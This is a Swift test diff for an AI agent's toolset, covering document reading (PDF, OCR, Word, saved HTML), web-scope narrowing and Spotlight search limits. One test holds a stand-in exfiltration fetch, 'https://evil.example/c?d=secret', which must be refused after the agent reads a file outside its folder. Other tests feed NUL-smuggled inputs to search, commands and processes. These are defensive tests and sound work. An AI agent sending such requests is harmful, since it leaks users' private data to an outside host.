@@ -1,3 +1,5 @@
+import AppKit
+import CoreText
 import Foundation
 
 @main
@@ -16,6 +18,10 @@ struct AgentToolsTests {
     }
 
     static func main() async {
+        // The harness reads documents through itself, as the app reads them through its helper.
+        if CommandLine.arguments.count > 1, CommandLine.arguments[1] == DocumentTextRequest.command {
+            exit(await DocumentTextExtractor.run(Array(CommandLine.arguments.dropFirst())))
+        }
         let root = FileManager.default.temporaryDirectory
             .appendingPathComponent("AgentToolsTests-\(UUID().uuidString)")
         defer { try? FileManager.default.removeItem(at: root) }
@@ -136,42 +142,6 @@ struct AgentToolsTests {
         let unknown = await agent.run(call(AgentToolbox.loadSkill, #"{"name":"nope"}"#))
         expect(unknown.isError && unknown.content.contains("deploy"), "an unknown skill names the real ones")
 
-        expect(
-            AgentHTML.text(from: "<html><script>x()</script><h1>Title</h1><p>A &amp; B</p></html>")
-                == "Title\nA & B",
-            "a page reads as its text, scripts dropped and entities decoded")
-        expect(
-            AgentHTML.text(from: "<p>10&#xB0; C, &#1052;&#1086;&#1089;&#1082;&#1074;&#1072; &minus;2&deg;</p>")
-                == "10° C, Москва −2°",
-            "numeric references decode by value, hex and decimal, as a weather page writes them")
-        expect(
-            AgentHTML.text(from: "<p>&amp;lt;b&amp;gt; &bogus; &#0; &#xD800;</p>") == "&lt;b&gt; &bogus; &#0; &#xD800;",
-            "one pass: an escaped entity stays escaped, and an unknown or impossible one stays as written")
-        let page = URL(string: "https://example.com/forecast")!
-        if case .failure(let failure) = AgentToolExecutor.readable(
-            "<html><body><div id=\"app\"></div><script>render()</script></body></html>", isHTML: true, from: page)
-        {
-            expect(
-                failure.message.contains("no readable text") && failure.message.contains("another result"),
-                "a page only its scripts would fill fails, and says to read another result")
-        } else {
-            expect(false, "a page only its scripts would fill fails, and says to read another result")
-        }
-        let sparse = try? AgentToolExecutor.readable(
-            "<html><title>Wind map</title><p>Loading…</p></html>", isHTML: true, from: page
-        ).get()
-        expect(
-            sparse?.hasPrefix("Wind map Loading…") == true && sparse?.contains("characters of text") == true,
-            "a page with a few words keeps them and says its content may be missing")
-        let full = String(repeating: "Ясно, +10°. ", count: 60)
-        expect(
-            (try? AgentToolExecutor.readable("<p>\(full)</p>", isHTML: true, from: page).get())?
-                .contains("characters of text") == false,
-            "a page with real text carries no warning")
-        expect(
-            (try? AgentToolExecutor.readable(#"{"temp":10}"#, isHTML: false, from: page).get()) == #"{"temp":10}"#,
-            "a short answer that is not HTML is passed on as it is")
-
         try? String(repeating: "0123456789abcdef\n", count: 6_400).write(
             toFile: folder + "/big.txt", atomically: true, encoding: .utf8)
         let big = await agent.run(call(AgentToolbox.readFile, #"{"path":"big.txt"}"#))
@@ -183,6 +153,9 @@ struct AgentToolsTests {
         await throughTheToolset(folder: folder, memory: memory)
         await aRefusalLeavesNoEffect(folder: folder, memory: memory)
         await thePlanToolOnlyShows(folder: folder, memory: memory)
+        await documentsReadByKind(folder: folder, memory: memory)
+        await personalReadsNarrowTheWeb(folder: folder, outside: outside, skill: skill, memory: memory)
+        await spotlightSearchesItsReach(folder: folder, outside: outside, memory: memory)
 
         print("\(passes) passed, \(failures) failed")
         if failures > 0 { exit(1) }
@@ -427,4 +400,232 @@ actor Asked {
     private(set) var last: AgentConsentRequest?
 
     func record(_ request: AgentConsentRequest) { last = request }
+}
+
+/// PDFs by pages, scans and images by OCR, rich text and saved pages, through the helper.
+extension AgentToolsTests {
+    static func documentsReadByKind(folder: String, memory: URL) async {
+        let me = URL(fileURLWithPath: CommandLine.arguments[0]).standardizedFileURL
+        let agent = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
+            consent: { _ in true }, documents: DocumentTextService(executable: me))
+        func read(_ arguments: String) async -> AIToolResult {
+            await agent.run(AIToolCall(id: "r", name: AgentToolbox.readFile, arguments: arguments))
+        }
+        let pdf = folder + "/docs/report.pdf"
+        try? FileManager.default.createDirectory(atPath: folder + "/docs", withIntermediateDirectories: true)
+        makePDF(at: URL(fileURLWithPath: pdf), pages: (1...60).map { $0 == 3 ? nil : "REPORT PAGE \($0) TEXT" })
+        let first = await read(#"{"path":"docs/report.pdf"}"#)
+        expect(
+            !first.isError && first.content.contains("PDF, 60 pages. Pages 1–50:")
+                && first.content.contains("[Page 2]\nREPORT PAGE 2 TEXT"),
+            "a PDF reads by pages from the first, got \(first.content.prefix(200))")
+        expect(
+            first.content.contains("[Page 3, scanned: its text was recognized by OCR]")
+                && first.content.contains("7391"),
+            "a scanned page is recognized")
+        expect(first.content.hasSuffix("Read on with pages \"51-\".]"), "and the answer says how to read on")
+        expect(first.content.utf8.count < AgentTurnBudget.resultBytes, "within the loop's own cut")
+        let later = await read(#"{"path":"docs/report.pdf","pages":"59-"}"#)
+        expect(
+            later.content.contains("Pages 59–60:") && !later.content.contains("Read on"),
+            "pages pick a range, and the last one says nothing more follows")
+        let number = await read(#"{"path":"docs/report.pdf","pages":7}"#)
+        expect(number.content.contains("[Page 7]") && !number.content.contains("[Page 8]"), "a page as a number")
+        let wrong = await read(#"{"path":"docs/report.pdf","pages":"seven"}"#)
+        expect(wrong.isError && wrong.content.contains("\"3-5\""), "pages that are no range say what is")
+        let past = await read(#"{"path":"docs/report.pdf","pages":"90"}"#)
+        expect(past.content.contains("has 60 pages; page 90 is past the end"), "and past the end says so")
+
+        let text = (1...3_000).map { "Line \($0) of the minutes." }.joined(separator: "\n")
+        let rich = NSAttributedString(string: text)
+        let docx = try? rich.data(
+            from: NSRange(location: 0, length: rich.length),
+            documentAttributes: [.documentType: NSAttributedString.DocumentType.officeOpenXML])
+        try? docx?.write(to: URL(fileURLWithPath: folder + "/docs/minutes.docx"))
+        let word = await read(#"{"path":"docs/minutes.docx"}"#)
+        expect(
+            word.content.hasPrefix(folder + "/docs/minutes.docx (document, as plain text):")
+                && word.content.contains("     1\tLine 1 of the minutes."),
+            "a Word file reads as numbered text, got \(word.content.prefix(160))")
+        expect(word.content.contains("continue with offset"), "and pages by line")
+        let wordOn = await read(#"{"path":"docs/minutes.docx","offset":2999,"limit":5}"#)
+        expect(wordOn.content.contains("  3000\tLine 3000 of the minutes."), "to its last line")
+
+        let page = """
+            <html><head><title>Saved</title><script>track()</script></head>
+            <body><nav>Menu</nav><h2>Plan</h2><p>See <a href="next.html">the next step</a> and
+            <a href="https://example.com/spec">the spec</a>.</p></body></html>
+            """
+        try? page.write(toFile: folder + "/docs/saved.html", atomically: true, encoding: .utf8)
+        let saved = await read(#"{"path":"docs/saved.html"}"#)
+        expect(
+            saved.content.contains("# Saved") && saved.content.contains("## Plan")
+                && saved.content.contains("See the next step and [the spec](https://example.com/spec).")
+                && !saved.content.contains("track()") && !saved.content.contains("Menu"),
+            "a saved page reads as Markdown, its web links kept, got \(saved.content)")
+        let source = await read(#"{"path":"docs/saved.html","raw":true}"#)
+        expect(source.content.contains("     2\t<body><nav>Menu</nav><h2>Plan</h2>"), "raw reads its source to edit")
+
+        let image = URL(fileURLWithPath: folder + "/docs/receipt.png")
+        writePNG(makeImage("ALPINE RECEIPT 7391"), to: image)
+        let ocr = await read(#"{"path":"docs/receipt.png"}"#)
+        expect(
+            ocr.content.contains("image, its text recognized by OCR") && ocr.content.contains("7391"),
+            "an image's text is recognized")
+        try? Data([0x01, 0x00, 0x02, 0x03]).write(to: URL(fileURLWithPath: folder + "/docs/blob.bin"))
+        let binary = await read(#"{"path":"docs/blob.bin"}"#)
+        expect(binary.isError && binary.content.contains("is a binary file"), "a binary file is refused, by name")
+        let directory = await read(#"{"path":"docs"}"#)
+        expect(directory.isError && directory.content.contains("list it with list_dir"), "a folder points at list_dir")
+        let none = await read(#"{"path":"docs/none.txt"}"#)
+        expect(none.isError && none.content.contains("does not exist"), "a missing file says so")
+
+        let lost = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
+            consent: { _ in true }, documents: DocumentTextService(executable: URL(fileURLWithPath: "/none")))
+        let unread = await lost.run(AIToolCall(id: "r", name: AgentToolbox.readFile, arguments: #"{"path":"docs/report.pdf"}"#))
+        expect(unread.isError && unread.content.contains("document reader is missing"), "no helper, said so")
+    }
+
+    /// After the user's own files, notes or screen, a fetch opens only what the turn was given.
+    static func personalReadsNarrowTheWeb(
+        folder: String, outside: String, skill: AgentSkill, memory: URL
+    ) async {
+        let web = AgentWebScope(unattended: false)
+        let agent = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [skill],
+            memoryURL: memory, consent: { _ in true }, web: web)
+        func run(_ name: String, _ arguments: String) async -> AIToolResult {
+            await agent.run(AIToolCall(id: name, name: name, arguments: arguments))
+        }
+        _ = await run(AgentToolbox.readFile, #"{"path":"src/a.txt"}"#)
+        _ = await run(AgentToolbox.readFile, "{\"path\":\"\(skill.directory)/SKILL.md\"}")
+        _ = await run(AgentToolbox.listDirectory, #"{"path":"src"}"#)
+        _ = await run(AgentToolbox.readFile, "{\"path\":\"\(outside)/missing.txt\"}")
+        expect(!web.isRestricted, "reading the folder, a skill or nothing at all leaves the web open")
+        let secret = await run(AgentToolbox.readFile, "{\"path\":\"\(outside)/secret.txt\"}")
+        expect(!secret.isError && web.isRestricted, "a file beyond the folder narrows it")
+        let refused = await run(AgentToolbox.webFetch, #"{"url":"https://evil.example/c?d=secret"}"#)
+        expect(
+            refused.isError
+                && refused.content == WebPageTool.outOfAgentScope(
+                    URL(string: "https://evil.example/c?d=secret")!, unattended: false),
+            "so a page the turn was not given is refused before any request, got \(refused.content)")
+
+        let listing = AgentWebScope(unattended: false)
+        let lister = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [],
+            memoryURL: memory, consent: { _ in true }, web: listing)
+        _ = await lister.run(AIToolCall(id: "l", name: AgentToolbox.listDirectory, arguments: "{\"path\":\"\(outside)\"}"))
+        expect(listing.isRestricted, "listing a folder beyond its own narrows it too")
+        let searching = AgentWebScope(unattended: false)
+        let searcher = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [],
+            memoryURL: memory, consent: { _ in true }, web: searching)
+        _ = await searcher.run(AIToolCall(
+            id: "s", name: AgentToolbox.searchFiles, arguments: "{\"pattern\":\"secret\",\"path\":\"\(outside)\"}"))
+        expect(searching.isRestricted, "and so does searching there")
+
+        let counted = AgentWebScope(unattended: true)
+        let tools = [AITool(name: AgentToolbox.webFetch, description: "", parameters: .object([:]), origin: "T")]
+        let links = (1...9).map { "https://user.example/\($0)" }
+        counted.note(AIRequest(messages: [AIMessage(role: .user, text: links.joined(separator: " "))], tools: tools))
+        let declining = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
+            consent: { _ in false }, web: counted)
+        var outcomes: [AIToolResult] = []
+        for link in links {
+            outcomes.append(await declining.run(
+                AIToolCall(id: link, name: AgentToolbox.webFetch, arguments: "{\"url\":\"\(link)\"}")))
+        }
+        expect(
+            outcomes.prefix(8).allSatisfy { $0.content == AgentToolFailure.declined.message }
+                && outcomes.last?.content == WebPageTool.agentReadsUsed(unattended: true),
+            "a run nobody watches opens eight given pages, and refuses a ninth unasked, got \(outcomes.last?.content ?? "")")
+
+        let invalid = await AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
+            consent: { _ in true }
+        ).run(AIToolCall(id: "w", name: AgentToolbox.webFetch, arguments: #"{"url":"https://me:pw@example.com/"}"#))
+        expect(invalid.isError && invalid.content.contains("no user name or password"), "an address with a user")
+    }
+
+    /// Spotlight's mode: what it may search, and what a query the model writes may not do.
+    static func spotlightSearchesItsReach(folder: String, outside: String, memory: URL) async {
+        func search(_ access: AgentAccess, _ arguments: String) async -> AIToolResult {
+            await AgentToolExecutor(
+                profile: AgentProfile(name: "T", directory: folder, access: access), skills: [],
+                memoryURL: memory, consent: { _ in true }
+            ).run(AIToolCall(id: "s", name: AgentToolbox.searchFiles, arguments: arguments))
+        }
+        let kind = await search(.workspaceWrite, #"{"pattern":"x","mode":"spotlight","kind":"movie"}"#)
+        expect(kind.isError && kind.content.hasPrefix("kind is one of: archive, audio"), "an unknown kind")
+        let date = await search(.workspaceWrite, #"{"pattern":"x","mode":"spotlight","modified_after":"2026-1-1"}"#)
+        expect(date.isError && date.content.contains("YYYY-MM-DD"), "a date that is not one")
+        let beyond = await search(.workspaceWrite, "{\"pattern\":\"x\",\"mode\":\"spotlight\",\"path\":\"\(outside)\"}")
+        expect(beyond.isError && beyond.content.contains("is outside"), "a folder it may not read")
+        let ran = await search(.readOnly, #"{"pattern":"needle","mode":"spotlight"}"#)
+        expect(
+            !ran.isError
+                && (ran.content.contains("/src/a.txt") || ran.content.hasPrefix("Spotlight found nothing")),
+            "a read-only agent searches its own folder, got \(ran.content)")
+        // Foundation raises on a NUL in a process's arguments, which would end the app mid-turn.
+        let nul = await search(.readOnly, #"{"pattern":"a\u0000b","mode":"spotlight"}"#)
+        expect(!nul.isError, "a NUL in a Spotlight pattern is dropped, so the search still runs, got \(nul.content)")
+        let text = await search(.readOnly, #"{"pattern":"a\u0000b"}"#)
+        expect(text.isError && text.content.contains("NUL"), "and refused in a text search, got \(text.content)")
+        let command = await AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder, access: .workspaceWrite), skills: [],
+            memoryURL: memory, consent: { _ in true }
+        ).run(AIToolCall(id: "c", name: AgentToolbox.runCommand, arguments: #"{"command":"echo a\u0000b"}"#))
+        expect(command.isError && command.content.contains("NUL"), "and in a command, got \(command.content)")
+        let process = await AgentProcess.run("/bin/echo", arguments: ["a\u{0}b"], timeout: 5)
+        expect(process.status == -1 && process.output.contains("NUL"), "the process runner refuses one itself")
+        let document = await DocumentTextService(executable: URL(fileURLWithPath: "/bin/echo"))
+            .read(DocumentTextRequest(path: "/tmp/a\u{0}b.pdf", kind: .pdf, budget: 1_024))
+        guard case .failure(let refusal) = document else { return expect(false, "a NUL path reached the reader") }
+        expect(refusal.message.contains("NUL"), "and so does the document reader")
+    }
+
+    /// One page a line of text; nil is a scanned page, an image with no text layer.
+    static func makePDF(at url: URL, pages: [String?]) {
+        var box = CGRect(x: 0, y: 0, width: 1000, height: 300)
+        let context = CGContext(consumer: CGDataConsumer(url: url as CFURL)!, mediaBox: &box, nil)!
+        for page in pages {
+            context.beginPDFPage(nil)
+            if let page {
+                draw(page, in: context)
+            } else {
+                context.draw(makeImage("SCANNED PAGE 7391"), in: box)
+            }
+            context.endPDFPage()
+        }
+        context.closePDF()
+    }
+
+    static func makeImage(_ text: String) -> CGImage {
+        let context = CGContext(
+            data: nil, width: 1000, height: 300, bitsPerComponent: 8, bytesPerRow: 4000,
+            space: CGColorSpaceCreateDeviceRGB(), bitmapInfo: CGImageAlphaInfo.noneSkipLast.rawValue)!
+        context.setFillColor(CGColor(gray: 1, alpha: 1))
+        context.fill(CGRect(x: 0, y: 0, width: 1000, height: 300))
+        draw(text, in: context)
+        return context.makeImage()!
+    }
+
+    static func writePNG(_ image: CGImage, to url: URL) {
+        let destination = CGImageDestinationCreateWithURL(url as CFURL, "public.png" as CFString, 1, nil)!
+        CGImageDestinationAddImage(destination, image, nil)
+        expect(CGImageDestinationFinalize(destination), "write \(url.lastPathComponent)")
+    }
+
+    static func draw(_ text: String, in context: CGContext) {
+        let attributes: [NSAttributedString.Key: Any] = [
+            NSAttributedString.Key(kCTFontAttributeName as String): CTFontCreateWithName("Helvetica" as CFString, 48, nil)
+        ]
+        let line = CTLineCreateWithAttributedString(NSAttributedString(string: text, attributes: attributes))
+        context.textPosition = CGPoint(x: 40, y: 150)
+        CTLineDraw(line, context)
+    }
 }
